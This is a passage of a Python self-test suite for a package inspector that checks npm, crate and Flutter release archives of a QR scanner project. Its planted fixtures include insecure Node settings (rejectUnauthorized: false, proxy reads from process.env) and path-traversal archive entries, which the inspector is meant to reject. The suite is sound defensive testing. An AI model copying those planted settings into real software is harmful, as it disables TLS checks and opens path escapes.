             "require('./qrcode-ai-scanner.darwin-arm64.node')", "names a retired package or file"),
            ("a WASI fallback", f"require('./{NODE_BINARY}.darwin-arm64.node')",
             f"require('./{NODE_BINARY}.darwin-arm64.node') || require('{NODE_NAME}-wasm32-wasi')",
             "has a WebAssembly or WASI lookup"))
        for label, old, new, needle in retired_lookups:
            if old not in native:
                failures.append(f"loader plant {label}: {old!r} not found in native.js")
                continue
            judge(f"main whose native.js looks up {label}", [npm("retired-loader", _npm_main(version) | {
                "native.js": native.replace(old, new, 1).encode()})], FAIL, needle)
        missing_branch = native
        for specifier in (f"./{NODE_BINARY}.linux-x64-musl.node", f"{NODE_NAME}-linux-x64-musl/package.json",
                          f"{NODE_NAME}-linux-x64-musl"):
            missing_branch = missing_branch.replace(f"require('{specifier}')", "undefined")
        judge("main whose native.js lost the linux-x64-musl branch",
              [npm("loader-missing", _npm_main(version) | {"native.js": missing_branch.encode()})], FAIL,
              f"./{NODE_BINARY}.linux-x64-musl.node looked up 0 times", f"{NODE_NAME}-linux-x64-musl looked up 0 times")
        mcp = renamed_npm(_npm_platform(version, "darwin-arm64"), f"{NODE_NAME}-mcp")
        judge("an -mcp package shaped as a platform package", [npm("as-platform-mcp", mcp)], FAIL,
              "known package name")
        judge("release set + an -mcp package shaped as a platform package",
              [main, *platforms, npm("set-mcp", mcp)], FAIL,
              f"{NODE_NAME}-mcp is neither the main package nor pinned by it", release_set=True)
        judge("main pinning an -mcp package", [npm("pin-mcp", _npm_main(version, pins | {f"{NODE_NAME}-mcp": version}))],
              FAIL, f"unexpected {NODE_NAME}-mcp")
        judge("a -wasm package shaped as a platform package (read as the Wasm package)",
              [npm("as-platform-wasm", renamed_npm(_npm_platform(version, "darwin-arm64"), WASM_NAME))], FAIL,
              f"exactly one WASM binary ({WASM_MODULE})")

        # Archive READMEs: at most the table's one previous-name sentence (none
        # for a package or file the table omits), the migration guide linked
        # from PyPI alone, and no availability text. A second previous-name
        # sentence is refused in each of its usual phrasings.
        core_readme = _clean_crate(version)["README.md"]
        # Windows checkouts retain CRLF inside Cargo archives. Paragraph
        # boundaries must not merge the CLI command block with its one
        # permitted historical-name sentence.
        for name, directory in CRATE_DIRS.items():
            original = (ROOT / directory / "README.md").read_bytes()
            lf = original.replace(b"\r\n", b"\n").replace(b"\r", b"\n")
            for ending in (b"\n", b"\r\n", b"\r"):
                text = lf.replace(b"\n", ending)
                art = Artifact(f"{name} README {ending!r}", "crate")
                check_readme(art, text, ("crate", name))
                ran += 1
                if art.status != PASS or art.checks[0].detail != PREVIOUS_NAMES[("crate", name)]:
                    failures.append(f"{art.name}: expected exactly the permitted historical-name sentence")
                extra = text + ending * 2 + b"This crate was formerly qrcode-ai-scanner-cli." + ending
                art = Artifact(f"{name} duplicate claim {ending!r}", "crate")
                check_readme(art, extra, ("crate", name))
                ran += 1
                if art.status != FAIL or art.checks[0].ok or "formerly" not in art.checks[0].detail:
                    failures.append(f"{art.name}: expected a rejected second historical-name sentence")
        guide = f"\nSee the [guide](https://example.com/{MIGRATION_GUIDE}.mdx).\n".encode()
        second = "README.md names a previous name only in its one sentence"
        for label, text, needle in (
                ("says not yet published", core_readme + b"\nNot yet published on crates.io.\n",
                 "README.md states no availability"),
                ("says coming soon", core_readme + b"\nA 0.11 release is coming soon.\n",
                 "README.md states no availability"),
                ("links the migration guide", core_readme + guide, "README.md links no migration guide"),
                ("names a previous name a second time", core_readme + b"\nThis crate was formerly qrcode-ai-scanner.\n",
                 second),
                ("says it was renamed", core_readme + b"\nThis crate was renamed from qrcode-ai-scanner.\n", second),
                ("says what it used to be called",
                 core_readme + b"\nIt used to be called qrcode-ai-scanner.\n", second),
                ("says what earlier versions shipped as",
                 core_readme + b"\nEarlier versions shipped as qrcode-ai-scanner.\n", second),
                ("mentions its earlier name",
                 core_readme + b"\nOlder releases stay installable under its earlier name.\n", second)):
            judge(f"crate whose README {label}",
                  [crate(f"readme-{re.sub(r'[^a-z0-9]+', '-', label)}", _clean_crate(version) | {"README.md": text})],
                  FAIL, needle)
        main_readme = _npm_main(version)["README.md"]
        main_sentence = PREVIOUS_NAMES[("npm", NODE_NAME)].encode()
        if main_sentence not in main_readme:
            failures.append("npm main README plant: its previous-name sentence is not in the README")
        judge("main package whose README gives another release for the previous name",
              [npm("readme-main", _npm_main(version) | {
                  "README.md": main_readme.replace(main_sentence, main_sentence.replace(b"0.10.1", b"0.10.0"))})],
              FAIL, "README.md names a previous name only in its one sentence", "0.10.0")
        platform_files = _npm_platform(version, "darwin-arm64")
        judge("platform package whose README omits the product links",
              [npm("readme-platform-links", platform_files | {"README.md": b"# Native addon\n"})], FAIL,
              "README.md is distribution/npm/README.md verbatim")
        judge("platform package whose README names a previous name",
              [npm("readme-platform", platform_files | {"README.md": platform_files["README.md"] + (
                  f"\nReleases up to 0.10.1 were published as `{RETIRED_SCOPE}qrcode-ai-scanner-darwin-arm64`.\n"
              ).encode()})], FAIL, "README.md names no previous name")
        wasm_files = _npm_wasm(version)
        judge("wasm package whose README states pending publication",
              [npm("readme-wasm", wasm_files | {"README.md": wasm_files["README.md"] + b"\nPending publication on npm.\n"})],
              FAIL, "README.md states no availability", "Pending publication")

        # --record: once nothing failed, one `<sha256>  <file>` line per archive
        # given, in sha256sum's format (what npm-publish checks each `npm
        # publish` operand against); none when anything failed, a stale record
        # removed.
        def judge_record(name: str, files: list, want: int, *options: str, stale: bool = False) -> None:
            nonlocal ran
            ran += 1
            record = base / "records" / re.sub(r"[^a-z0-9]+", "-", name) / "inspected.sha256"
            record.parent.mkdir(parents=True, exist_ok=True)
            if stale:
                record.write_text(f"{'0' * 64}  stale.tgz\n")
            code = _run_main(["archive", *map(str, files), *options, "--quiet", "--record", str(record)])
            want_text = "".join(f"{sha256(p.read_bytes())}  {p}\n" for p in files) if want == 0 else None
            got = record.read_text() if record.exists() else None
            if code != want or got != want_text:
                failures.append(f"{name}: exit {code} (want {want}), record {got!r:.90} (want {want_text!r:.90})")

        judge_record("--record after a passing npm release set", [main, *platforms], 0, "--release-set")
        judge_record("--record after a failing npm release set, a stale record removed", [main, *platforms[:-1]], 1,
                     "--release-set", stale=True)
        judge_record("--record after one wasm tarball", [npm("record-wasm", _npm_wasm(version))], 0)
        ran += 1
        if _run_main(["versions", "--record", str(base / "versions.sha256")]) != 2:
            failures.append("--record with versions: not refused as a usage error (exit 2)")

        # A failed check must return the inspection verdict and retain its
        # complete UTF-8 diagnostics even under the legacy Windows locale.
        invalid = crate("report-encoding", _clean_crate(version) | {"LICENSE": b"MIT\n"})
        for quiet in (False, True):
            output = base / f"report-encoding-{quiet}"
            summary = base / f"report-summary-{quiet}.md"
            record = base / f"report-record-{quiet}.sha256"
            record.write_text("stale\n", encoding="utf-8")
            env = dict(os.environ, PYTHONIOENCODING="cp1252", PYTHONUTF8="0", GITHUB_STEP_SUMMARY=str(summary))
            proc = subprocess.run([sys.executable, str(ROOT / "scripts/package-inspect.py"), "archive",
                                   str(invalid), "--strict", "--out", str(output), "--record", str(record),
                                   *(["--quiet"] if quiet else [])], cwd=ROOT, env=env, capture_output=True)
            ran += 1
            try:
                report = json.loads((output / "package-inspect.json").read_text(encoding="utf-8"))
                rendered = (output / "package-inspect.md").read_text(encoding="utf-8")
                failed = [c["name"] for a in report for c in a["checks"] if not c["ok"]]
                ok = (proc.returncode == 1 and b"UnicodeEncodeError" not in proc.stderr
                      and report[0]["status"] == FAIL
                      and failed == ["LICENSE is the AGPL text, byte-identical to the root LICENSE"]
                      and summary.read_text(encoding="utf-8") == rendered and not record.exists()
                      and "FAIL" in proc.stdout.decode("utf-8") and "FAIL" in proc.stderr.decode("utf-8"))
            except (OSError, ValueError, KeyError, IndexError):
                ok = False
            if not ok:
                failures.append(f"cp1252 report (quiet={quiet}): expected exit 1, exact license failure and UTF-8 receipts")

    flutter_count, flutter_failures = flutter_self_test()
    ran += flutter_count
    failures.extend(flutter_failures)
    cli_count, cli_failures = cli_self_test()
    ran += cli_count
    failures.extend(cli_failures)
    destination_count, destination_failures = destination_self_test()
    ran += destination_count
    failures.extend(destination_failures)
    for failure in failures:
        print(f"SELF-TEST FAILED · {failure}", file=sys.stderr)
    print(f"self-test: {ran - len(failures)}/{ran} scenarios as expected")
    return 1 if failures else 0


def destination_self_test():
    """The static readers of the destination modules on small sources: each rule refuses its
    form, and the same words in comments, strings, templates, regular expressions, nested
    functions and property names pass."""
    failures, ran = [], 0

    def case(name: str, judge, source: str, *needles: str) -> None:
        nonlocal ran
        ran += 1
        problems = read_module(judge, source)
        text = "; ".join(problems)
        if bool(problems) != bool(needles) or any(needle not in text for needle in needles):
            failures.append(f"{name}: " + (f"problems {text!r}" if problems else "no problem")
                            + (f" (want problems naming {list(needles)})" if needles else " (want none)"))

    core, floor, node = judge_isolated_core, judge_browser_floor, judge_node_resolver
    case("core: module words only in comments, strings, templates, patterns and keys", core,
         "// import x from 'y'; export * from 'z'; require('fs'); import('w')\n"
         "/* export { a } from './b.js'; */\n"
         "const text = 'import x from \"y\"', other = \"require('fs')\";\n"
         "const pattern = /import\\(|require\\(/u, where = import.meta.url;\n"
         "const keys = { import: 1, require: 2 }.import;\n"
         "export const label = `${text} from ${other}`;\n"
         "export default function load() { return keys; }\n")
    for label, source, needle in (
            ("a default import", "import x from './y.js';", "import './y.js'"),
            ("a side-effect import", "import './side.js';", "import './side.js'"),
            ("a namespace import", "import * as ns from './y.js';", "import './y.js'"),
            ("export * from", "export * from './y.js';", "export … from './y.js'"),
            ("export * as … from", "export * as ns from './y.js';", "export … from './y.js'"),
            ("export {…} from", "export { a, b as c } from './y.js';", "export … from './y.js'"),
            ("a dynamic import", "export const load = () => import('./y.js');", "import()"),
            ("require()", "const fs = require('node:fs');", "require()")):
        case(f"core: {label}", core, source, needle)

    case("floor: ES2020 forms, and newer names only in comments, strings, patterns and keys", floor, r"""
// AbortSignal.any, structuredClone, a ??= b, 1_000, class A { x = 1 }, await x
const words = 'AbortSignal.any(x) xs.toSorted() a ??= b 1_000 #private /v';
const pattern = /[/`'"]+(?:\??=)?/gu, half = total / 2 / 1, big = 10n ** 2n, pick = words?.length ?? 0;
const parts = `${words.at(-1)}/${pattern.source}${`${half}`}`;
export const later = async () => await Promise.resolve(parts);
export async function load(signal) { for await (const x of signal) await x; return { with: 1 }.with; }
export const view = { async get() { return await later(); }, class: 'x' };
class Base {
  constructor(a) { this.a = a; }
  static of(a) { return new Base(a); }
  get value() { return this.a; }
  set value(v) { this.a = v; }
  async *items() { yield await this.a; }
  ['computed']() { return new RegExp('a', 'gi'); }
}
export { Base };
""")
    case("floor: newer method words as plain names, keys, array items and uncalled members", floor, r"""
const take = 1, drop = { union: 2, toArray: 3 }, words = ['toSorted', 'with', `isWellFormed`];
const picked = words.indexOf('with') >= 0 ? drop.union : drop['toArray'];
class Pool {
  union(other) { return [this, other]; }
  ['take']() { return take; }
}
export const pool = { intersection: new Pool(), difference: 0, ['drop']: drop, picked };
export const patterns = [/\(?i:a\)/u, /[(?i:)]+/, /(?:a)|(?<x>b)|(?<z>c)/u, /(?<=a)(?<!b)c/];
export const later = Promise.resolve(take), text = String.raw`(?i:x)`;
""")
    for label, source, needle in (
            ("AbortSignal.any", "export const both = (a, b) => AbortSignal.any([a, b]);", "AbortSignal.any"),
            ("AbortSignal.timeout", "fetch(url, { signal: AbortSignal.timeout(5000) });", "AbortSignal.timeout"),
            ("AbortSignal?.['any']", "export const any = globalThis.AbortSignal?.['any'];", "AbortSignal.any"),
            ("URL.canParse", "export const ok = (u) => URL.canParse(u);", "URL.canParse"),
            ("URL.parse", "export const parsed = (u) => URL.parse(u);", "URL.parse"),
            ("Promise.withResolvers", "const { promise, resolve } = Promise.withResolvers();", "Promise.withResolvers"),
            ("Object.groupBy", "const kinds = Object.groupBy(items, (item) => item.kind);", "Object.groupBy"),
            ("Map.groupBy", "const kinds = Map.groupBy(items, (item) => item.kind);", "Map.groupBy"),
            ("Array.fromAsync", "export const all = (xs) => Array.fromAsync(xs);", "Array.fromAsync"),
            ("toSorted", "export const sorted = (xs) => xs.toSorted();", "toSorted"),
            ("toReversed", "export const back = (xs) => xs.toReversed();", "toReversed"),
            ("toSpliced", "export const cut = (xs) => xs.toSpliced(0, 1);", "toSpliced"),
            ("Array.prototype.with", "export const swap = (xs) => xs.with(0, 1);", ".with()"),
            ("structuredClone", "export const copy = (x) => structuredClone(x);", "structuredClone"),
            ("String isWellFormed", "export const ok = (s) => s.isWellFormed();", "isWellFormed"),
            ("String toWellFormed", "export const fixed = (s) => s.toWellFormed();", "toWellFormed"),
            ("Set union", "export const all = (a, b) => a.union(b);", ".union()"),
            ("Set intersection", "export const both = (a, b) => a.intersection(b);", ".intersection()"),
            ("Set difference", "export const rest = (a, b) => a.difference(b);", ".difference()"),
            ("Set symmetricDifference", "export const odd = (a, b) => a.symmetricDifference(b);",
             "symmetricDifference"),
            ("Set isSubsetOf", "export const within = (a, b) => a.isSubsetOf(b);", "isSubsetOf"),
            ("Set isSupersetOf", "export const covers = (a, b) => a.isSupersetOf(b);", "isSupersetOf"),
            ("Set isDisjointFrom", "export const apart = (a, b) => a.isDisjointFrom(b);", "isDisjointFrom"),
            ("Iterator.from", "export const wrap = (it) => Iterator.from(it);", "line 1: Iterator"),
            ("an iterator's take", "export const first = (it) => it.take(1);", ".take()"),
            ("an iterator's drop", "export const rest = (it) => it.drop(1);", ".drop()"),
            ("an iterator's toArray", "export const list = (map) => map.keys().toArray();", ".toArray()"),
            ("Promise.try", "export const run = (f) => Promise.try(f);", "Promise.try"),
            ("RegExp.escape", "export const exact = (s) => new RegExp(RegExp.escape(s), 'u');", "RegExp.escape"),
            ("a quoted toSorted member", "export const sorted = (xs) => xs['toSorted']();", "toSorted"),
            ("a quoted with member", "export const swap = (xs) => xs['with'](0, 1);", ".with()"),
            ("an optional quoted union member", "export const all = (a, b) => a?.['union'](b);", ".union()"),
            ("a template-quoted static", "export const any = AbortSignal[`any`];", "AbortSignal.any"),
            ("||=", "let a;\na ||= 1;", "line 2: logical assignment ||="),
            ("&&=", "let a = 1;\na &&= 2;", "logical assignment &&="),
            ("??= in a template substitution", "export const t = (o) => `${o.x ??= 1}`;", "logical assignment ??="),
            ("a decimal numeric separator", "const limit = 16_384;", "numeric separator 16_384"),
            ("a hexadecimal numeric separator", "const mask = 0xFF_FF;", "numeric separator 0xFF_FF"),
            ("a class field", "class A { x = 1; }", "class field"),
            ("a static field after a method", "class A { m() { return 1; } static y; }", "class field"),
            ("a class static block", "class A { static { A.ready = true; } }", "class static block"),
            ("a private method", "class A { #check() { return 1; } run() { return this.#check(); } }",
             "private class member #check"),
            ("a top-level await", "await ready();", "line 1: top-level await"),
            ("an await in a top-level block", "if (ok) {\n  await ready();\n}", "line 2: top-level await"),
            ("a top-level for await", "for await (const chunk of stream) use(chunk);", "top-level await"),
            ("an await after an arrow argument", "run(() => 1, await ready());", "top-level await"),
            ("the RegExp v flag", r"const letters = /[\p{L}--\p{Lu}]/v;", "RegExp v flag"),
            ("the RegExp d flag", "const found = /a+/d.exec(text);", "RegExp d flag"),
            ("the RegExp d flag by constructor", "const r = new RegExp(source, 'dg');", "RegExp d flag"),
            ("the RegExp v flag after an arrow", "export const word = (x) => /[/]+/v.test(x);", "RegExp v flag"),
            ("a RegExp modifier group", "export const word = /(?i:abc)d/u;", "RegExp modifier group (?i:"),
            ("a RegExp modifier group removing a flag", "export const line = /(?-s:.)+/s;",
             "RegExp modifier group (?-s:"),
            ("a RegExp group name used twice", r"export const year = /(?<y>\d{4})|(?<y>\d{2})/u;",
             "RegExp group name 'y' used twice"),
            ("a source the reader cannot read", "const s = 'unterminated;", "not readable as JavaScript")):
        case(f"floor: {label}", floor, source, needle)

    base = ("import http from 'node:http';\nimport https from 'node:https';\nimport dns from 'node:dns';\n"
            "import { resolveDestination } from './destination.js';\n"
            "export const settings = { insecureHTTPParser: false, rejectUnauthorized: true };\n")
    case("resolver: the four modules and the literal settings", node, base)
    case("resolver: refused names only in comments and strings, and a local agent", node, base
         + "// never process.env, https.globalAgent, proxyEnv or agent: false\n"
         "const why = 'rejectUnauthorized: false and agent: false are never set';\n"
         "const agent = new http.Agent({ keepAlive: false });\n"
         "export const hop = { agent, node: process.versions.node, lookup: dns.lookup };\n")
    case("resolver: process reached through globalThis for its versions only, and a process key", node, base
         + "const scope = globalThis;\nconst host = scope.process;\n"
         "export const onNode = () => typeof host.versions.node === 'string';\n"
         "export const options = { process: 1, method: 'GET' };\n")
    for label, source, needle in (
            ("another built-in", base + "import net from 'node:net';", "imports node:net"),
            ("a re-export of another module", base + "export * from 'node:fs';", "imports node:fs"),
            ("node:dns not imported", base.replace("import dns from 'node:dns';\n", ""), "does not import node:dns"),
            ("a dynamic import", base + "export const load = () => import('node:net');", "import()"),
            ("require()", base + "const fs = require('node:fs');", "require()"),
            ("process.getBuiltinModule()", base + "const net = process.getBuiltinModule('node:net');",
             "getBuiltinModule()"),
            ("process.env", base + "const proxy = process.env.HTTPS_PROXY;", "process.env"),
            ("process['env']", base + "const env = process['env'];", "process.env"),
            ("process[`env`]", base + "export const vars = process[`env`];", "process.env"),
            ("env destructured from process", base + "const { env } = process;\nexport const proxy = env.HTTPS_PROXY;",
             "process other than process.versions"),
            ("the process global aliased", base + "const proc = process;\nexport const vars = proc['e' + 'nv'];",
             "process other than process.versions"),
            ("env read from process reached another way",
             base + "const host = globalThis.process;\nexport const vars = host.env;", "host.env"),
            ("env destructured from process reached another way",
             base + "export const { env: vars } = globalThis.process;", "line 6: env"),
            ("the global agent", base + "const shared = https.globalAgent;", "globalAgent"),
            ("an agent's proxy environment", base + "const agent = new http.Agent({ proxyEnv: {} });", "proxyEnv"),
            ("agent: false", base + "export const fresh = { agent: false };", "agent: false"),
            ("insecureHTTPParser: true", base + "export const loose = { insecureHTTPParser: true };",
             "insecureHTTPParser is not the literal false"),
            ("rejectUnauthorized: false", base + "export const lax = { rejectUnauthorized: false };",
             "rejectUnauthorized is not the literal true"),
            ("rejectUnauthorized from a caller", base + "export const pick = (allow) => ({ rejectUnauthorized: allow });",
             "rejectUnauthorized is not the literal true"),
            ("rejectUnauthorized assigned", base + "options.rejectUnauthorized = false;",
             "rejectUnauthorized is not the literal true"),
            ("no rejectUnauthorized: true", base.replace(", rejectUnauthorized: true", ""), "no rejectUnauthorized: true"),
            ("no insecureHTTPParser: false", base.replace("insecureHTTPParser: false, ", ""),
             "no insecureHTTPParser: false")):
        case(f"resolver: {label}", node, source, needle)
    return ran, failures


def flutter_self_test():
    staging = flutter_staging()
    version = workspace_version()
    core, snapshot, revision = staging.fixture(version)
    core["LICENSE"] = LICENSE.read_bytes()
    snapshot.update({"LICENSE": LICENSE.read_bytes(), f"{staging.CORE}/LICENSE": LICENSE.read_bytes(),
                     f"{staging.BINDING}/LICENSE": LICENSE.read_bytes(),
                     f"{staging.BINDING}/README.md": b"readme\n", f"{staging.BINDING}/CHANGELOG.md": b"changes\n"})
    for name in ("analysis_options.yaml", "example/analysis_options.yaml"):
        snapshot[f"{staging.BINDING}/{name}"] = b'include: package:flutter_lints/flutter.yaml\n'
    snapshot[f"{staging.BINDING}/example/pubspec.lock"] = b"packages: {}\n"
    snapshot[f"{staging.BINDING}/rust/Cargo.toml"] += b'\n[profile.release.package.rxing]\noverflow-checks = true\n'
    pubspec = f"{staging.BINDING}/pubspec.yaml"
    snapshot[pubspec] = f"name: {FLUTTER_NAME}\n".encode() + snapshot[pubspec]
    revision = subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=ROOT, text=True).strip()
    core[".cargo_vcs_info.json"] = json.dumps({"git": {"sha1": revision}, "path_in_vcs": staging.CORE}).encode()
    packed = staging.archive_bytes({f"qrcode-barcode-scanner-{version}/{name}": data for name, data in core.items()})
    clean, _ = staging.bundle(packed, snapshot, revision)
    names = sorted(name for name in clean if name not in (".pubignore", "example/pubspec.lock"))
    # Candidates that differ from the clean one in their pub name or README:
    # each is staged from its own snapshot, so only the name or the text differs.
    variants = {}
    for key, name, data in (
            ("retired name", pubspec, snapshot[pubspec].replace(FLUTTER_NAME.encode(), RETIRED_MODULE.encode())),
            ("pending README", f"{staging.BINDING}/README.md", b"readme\n\nNot yet published on pub.dev.\n"),
            ("previous-name README", f"{staging.BINDING}/README.md",
             f"readme\n\nReleases up to 0.10.1 were published as `{RETIRED_MODULE}`.\n".encode())):
        variant = snapshot | {name: data}
        variants[key] = (staging.bundle(packed, variant, revision)[0], variant)

    def tree(names):
        rows, seen = [], set()
        for name in sorted(names):
            parts = name.split("/")
            for depth, part in enumerate(parts):
                prefix = "/".join(parts[:depth + 1])
                if prefix not in seen:
                    rows.append("│   " * depth + "├── " + part + (" (<1 KB)" if depth == len(parts) - 1 else ""))
                    seen.add(prefix)
        return "\n".join(rows) + "\n"

    failures, count = [], 0
    scenarios = [
        ("portable candidate", clean, names, 0, "", PASS),
        ("warning-only pub validation", clean, names, 65, "Package has 1 warning.\n", PASS),
        ("validator error with tree", clean, names, 65, "validation failed\n", FAIL),
        ("unparsed pub listing", clean, [], 0, "files omitted\n", FAIL),
        ("core source omitted", clean, [name for name in names if not name.endswith("src/lib.rs")], 0, "", FAIL),
        ("unexpected published source", clean | {"extra.txt": b"stray"}, names + ["extra.txt"], 0, "", FAIL),
        ("core source tampered", clean | {f"{staging.VENDOR}/src/lib.rs": b"old core"}, names, 0, "", FAIL),
        ("binding lock tampered", clean | {"rust/Cargo.lock": b"changed"}, names, 0, "", FAIL),
        ("unpublished example lock resolved", clean | {"example/pubspec.lock": b"resolved by pub\n"}, names, 0, "", PASS),
        ("published example lock tampered", clean | {"example/pubspec.lock": b"changed"},
         names + ["example/pubspec.lock"], 0, "", FAIL),
        ("published example lock unchanged", clean, names + ["example/pubspec.lock"], 0, "", PASS),
        ("binding analyzer migrated", clean | {"analysis_options.yaml": b"analyzer: {}\n"}, names, 0, "", FAIL),
        ("example analyzer migrated", clean | {"example/analysis_options.yaml": b"analyzer: {}\n"}, names, 0, "", FAIL),
        ("recursive target escape", clean | {"nested/Cargo.toml": b'[target.x.dependencies]\nbad = { path = "../../outside" }\n'},
         names + ["nested/Cargo.toml"], 0, "", FAIL),
        ("duplicate tree entry", clean, names, 0, "├── LICENSE (<1 KB)\n", FAIL),
        ("tree traversal", clean, names, 0, "├── ..\n│   └── outside (<1 KB)\n", FAIL),
    ]
    # (…, the snapshot the candidate was staged from, --release-set, a needle of
    # the failing checks, or of the notes of a candidate that passes)
    scenarios = [(*row, snapshot, True, "") for row in scenarios]
    retired, retired_snapshot = variants["retired name"]
    pending, pending_snapshot = variants["pending README"]
    previous, previous_snapshot = variants["previous-name README"]
    scenarios += [
        ("release set under the 0.10 pub name", retired, names, 0, "", FAIL, retired_snapshot, True,
         f"pubspec name is {FLUTTER_NAME}"),
        ("the 0.10 pub name before the release set", retired, names, 0, "", PASS, retired_snapshot, False,
         f"pubspec name {RETIRED_MODULE}: {FLUTTER_NAME} is required with --release-set"),
        ("release set whose README says not yet published", pending, names, 0, "", FAIL, pending_snapshot, True,
         "README.md states no availability"),
        ("a README that says not yet published before the release set", pending, names, 0, "", PASS,
         pending_snapshot, False, "README.md states availability (Not yet published): refused with --release-set"),
        ("a README naming a previous name", previous, names, 0, "", FAIL, previous_snapshot, False,
         "README.md names no previous name"),
    ]
    current = {"snapshot": snapshot}
    original_snapshot = staging.candidate_snapshot
    staging.candidate_snapshot = lambda root, candidate: current["snapshot"]
    try:
        with tempfile.TemporaryDirectory(prefix="flutter-inspect-selftest-") as temporary:
            for label, files, listing, status, suffix, expected, staged_from, release_set, needle in scenarios:
                count += 1
                current["snapshot"] = staged_from
                root = pathlib.Path(temporary) / str(count)
                staging.write_tree(root, files)
                host = Host(build_parser().parse_args(["flutter", "--package-root", str(root), "--flutter", "fake-pub",
                                                       "--strict", *(["--release-set"] if release_set else [])]))
                commands = []

                def run(label, command, cwd=ROOT, timeout=0):
                    commands.append((command, cwd))
                    return subprocess.CompletedProcess(command, status, tree(listing) + suffix, "")

                host.run = run
                try:
                    cmd_flutter(host)
                    actual = host.artifacts[0].status
                    if actual != expected or commands != [(["fake-pub", "pub", "publish", "--dry-run"], root.resolve())]:
                        failures.append(f"Flutter {label}: {actual}, expected {expected}; commands {commands}")
                    failed = " · ".join(f"{c.name}: {c.detail}" for c in host.artifacts[0].checks if not c.ok)
                    notes = " · ".join(host.artifacts[0].notes)
                    if needle and expected == FAIL and needle not in failed:
                        failures.append(f"Flutter {label}: no failing check names {needle!r} (failing: {failed})")
                    if needle and expected == PASS and needle not in notes:
                        failures.append(f"Flutter {label}: no note names {needle!r} (notes: {notes})")
                    if expected == PASS and len(host.recorded) != len(listing):
                        failures.append(f"Flutter {label}: incomplete same-byte record")
                    if expected == PASS:
                        boundary = "example/pubspec.lock is absent from the pub file tree; runtime app lock not part of published-byte identity"
                        if (boundary in host.artifacts[0].notes) != ("example/pubspec.lock" not in listing):
                            failures.append(f"Flutter {label}: incorrect unpublished app-lock boundary")
                finally:
                    shutil.rmtree(host.scratch)
    finally:
        staging.candidate_snapshot = original_snapshot
    return count, failures


# CLI release fixtures: what the one writer makes, built here byte by byte so a
# plant changes exactly one thing.
CLI_FIXTURE_EPOCH = 1793597346
CLI_FIXTURE_RUN = "https://github.com/qrcode-ai-com/qrcode-barcode-scanner/actions/runs/1234567890"
CLI_FIXTURE_LICENSES = {"clap": "MIT OR Apache-2.0", "image": "MIT OR Apache-2.0", "rqrr": "MIT OR Apache-2.0",
                        "rxing": "Apache-2.0", "serde_json": "MIT OR Apache-2.0"}
_APACHE_TEXT = b"Apache License\nVersion 2.0, January 2004\n"
_MIT_TEXT = b"MIT License\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\n"
GZIP_HEADER = b"\x1f\x8b\x08\x00\0\0\0\0\x02\xff"  # no flag, mtime 0, XFL 2 (level 9), OS 255


def _gzip(data: bytes, level: int = 1, header: bytes = GZIP_HEADER) -> bytes:
    """DATA as one gzip member under HEADER (level 1: the inspector does not judge the level). Not
    gzip.compress: before Python 3.13 its mtime-0 path writes zlib's OS byte, where gzip.GzipFile writes 255."""
    deflate = zlib.compressobj(level, zlib.DEFLATED, -15)
    body = deflate.compress(data) + deflate.flush()
    return header + body + zlib.crc32(data).to_bytes(4, "little") + (len(data) % 2 ** 32).to_bytes(4, "little")


def _tar_blocks(rows: list, fmt: int = tarfile.USTAR_FORMAT) -> bytes:
    """[(TarInfo, bytes)] as tar header and data blocks, no end-of-archive marker."""
    return b"".join(info.tobuf(fmt, "utf-8", "surrogateescape") + data + b"\0" * (-len(data) % 512)
                    for info, data in rows)


def _ustar(rows: list, fmt: int = tarfile.USTAR_FORMAT, pax_global: dict = None) -> bytes:
    """ROWS as one tar stream: a pax global header when given, the members, the end blocks, record padding."""
    head = tarfile.TarInfo.create_pax_global_header(pax_global) if pax_global else b""
    stream = head + _tar_blocks(rows, fmt) + b"\0" * 1024
    return stream + b"\0" * (-len(stream) % tarfile.RECORDSIZE)


def _cli_rows(top: str, files: dict, binary: str, epoch: int = CLI_FIXTURE_EPOCH) -> list:
    """TOP/ then FILES under it as the one writer's tar members: bytewise order, uid/gid 0, no user or group
    name, mtime EPOCH, 0755 for the directory and BINARY, 0644 for the rest."""
    rows = []
    for name in sorted(["", *files], key=lambda n: n.encode()):
        info = tarfile.TarInfo(f"{top}/{name}" if name else top)
        info.type = tarfile.REGTYPE if name else tarfile.DIRTYPE
        info.mode = 0o755 if name in ("", binary) else 0o644
        info.size = len(files[name]) if name else 0
        info.mtime, info.uid, info.gid, info.uname, info.gname = epoch, 0, 0, "", ""
        rows.append((info, files.get(name, b"")))
    return rows


def _cli_zip(top: str, files: dict, binary: str, edit=None, extra=(), comment: bytes = b"") -> bytes:
    """TOP/ then FILES as the one writer's zip: deflated (the directory stored), date_time from
    CLI_FIXTURE_EPOCH, create_system 3, modes in external_attr. EDIT(name, ZipInfo) changes an entry before
    it is written; EXTRA [(name, bytes)] follows the regular entries."""
    buffer = io.BytesIO()
    with warnings.catch_warnings(), zipfile.ZipFile(buffer, "w") as archive:
        warnings.simplefilter("ignore")  # a planted duplicate name
        for name in sorted(["", *files], key=lambda n: n.encode()):
            info = zipfile.ZipInfo(f"{top}/{name}", dos_time(CLI_FIXTURE_EPOCH))
            info.create_system = 3
            info.external_attr = (0o040755 if not name else 0o100755 if name == binary else 0o100644) << 16
            info.compress_type = zipfile.ZIP_DEFLATED if name else zipfile.ZIP_STORED
            if edit is not None:
                edit(name, info)
            archive.writestr(info, files.get(name, b""), compresslevel=1)
        for name, data in extra:
            info = zipfile.ZipInfo(name, dos_time(CLI_FIXTURE_EPOCH))
            info.create_system, info.external_attr = 3, 0o100644 << 16
            archive.writestr(info, data, compress_type=zipfile.ZIP_DEFLATED, compresslevel=1)
        archive.comment = comment
    return buffer.getvalue()


def _zip_patch(raw: bytes, name: str, flags: int = 0, method: int = None) -> bytes:
    """RAW with FLAGS or'ed into NAME's general-purpose flags and its compression METHOD replaced, in the local
    header and the central directory alike (zipfile resets both when it writes)."""
    data, encoded = bytearray(raw), name.encode()
    with zipfile.ZipFile(io.BytesIO(raw)) as archive:
        local, pos = archive.getinfo(name).header_offset, archive.start_dir
    places = [(local + 6, local + 8)]
    while data[pos:pos + 4] == b"PK\x01\x02":
        sizes = [int.from_bytes(data[pos + i:pos + i + 2], "little") for i in (28, 30, 32)]
        if sizes[0] == len(encoded) and data[pos + 46:pos + 46 + sizes[0]] == encoded:
            places.append((pos + 8, pos + 10))
        pos += 46 + sum(sizes)
    for flag_at, method_at in places:
        data[flag_at] |= flags
        if method is not None:
            data[method_at:method_at + 2] = method.to_bytes(2, "little")
    return bytes(data)


